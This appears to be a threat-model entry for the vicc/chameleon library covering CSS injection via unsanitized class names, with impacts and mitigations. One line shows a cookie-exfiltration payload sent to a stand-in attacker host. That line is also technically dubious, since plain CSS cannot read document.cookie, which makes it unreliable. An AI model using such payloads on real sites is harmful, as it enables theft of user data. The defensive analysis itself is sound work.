# Threat Model Analysis for vicc/chameleon

## Threat: [CSS Injection via Unsanitized Class Names](./threats/css_injection_via_unsanitized_class_names.md)

* **Description:** An attacker provides malicious input that is used directly as a CSS class name or part of a CSS class name processed by Chameleon. This allows the attacker to inject arbitrary CSS into the application's styles. The attacker might craft CSS to:
    * Exfiltrate data by using `background-image: url("https://attacker.com/log?" + document.cookie)`. 
    * Deface the website by manipulating the layout, colors, and visibility of elements.
    * Potentially perform actions on behalf of the user if the injected CSS interacts with JavaScript or other browser features in unexpected ways. This threat directly involves Chameleon's role in processing and applying the unsanitized class names.
* **Impact:**
    * **High:** Data exfiltration could lead to the compromise of sensitive user information or application data.
    * **High:** Website defacement can damage the application's reputation and user trust.
    * **Medium:** Unexpected behavior or manipulation of the user interface can disrupt the user experience.
* **Affected Chameleon Component:** The core class processing logic within Chameleon, specifically where it handles and applies the provided class names.
* **Risk Severity:** Critical
* **Mitigation Strategies:**
    * **Strict Input Sanitization:** Sanitize all user-provided input that influences CSS class names *before* passing it to Chameleon. Use allow-lists of permitted characters or patterns rather than deny-lists.
    * **Contextual Output Encoding:** While Chameleon deals with CSS classes, ensure the HTML context where these classes are applied is properly encoded to prevent broader injection attacks.
    * **Consider using predefined class mappings:** Instead of directly using user input, map user choices to a predefined set of safe CSS class names before they are processed by Chameleon.

